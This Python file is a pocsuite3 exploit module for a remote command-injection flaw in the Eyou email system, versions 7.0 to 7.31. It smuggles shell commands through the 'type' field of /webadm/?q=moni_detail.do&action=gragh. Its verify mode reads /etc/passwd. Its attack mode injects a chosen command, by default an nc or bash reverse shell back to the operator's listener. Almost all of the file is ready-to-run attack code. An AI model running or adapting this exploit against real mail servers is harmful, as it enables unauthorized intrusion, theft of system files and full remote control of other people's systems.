from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '亿邮电子邮件系统命令执行'
    appName = 'Eyou'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''2021攻防演习期间，亿邮电子邮件系统被爆存在远程命令执行漏洞，攻击者可以执行任意命令。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self): # 接收用户外部输出参数command
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _verify(self):#验证模式
        result = {}
        headers = {
            'Content-Length': '29',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
        }
        try:
            data = "type=\'|cat /etc/passwd||\'"
            target = self.url+"/webadm/?q=moni_detail.do&action=gragh"
            r = requests.post(url=target,timeout=8,verify=False,headers=headers,data=data)
            if r.status_code == 200 and "root" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def _attack(self):
        result = {}
        cmd = self.get_option("command")
        headers = {
            'Content-Length': '29',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
        }
        try:
            target = self.url+"/webadm/?q=moni_detail.do&action=gragh"
            data = "type=\'|"+cmd+"||\'"
            r = requests.get(url=target,timeout=8,verify=False,headers=headers,data=data)
            if r.status_code == 200 :
                print(r.text)
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)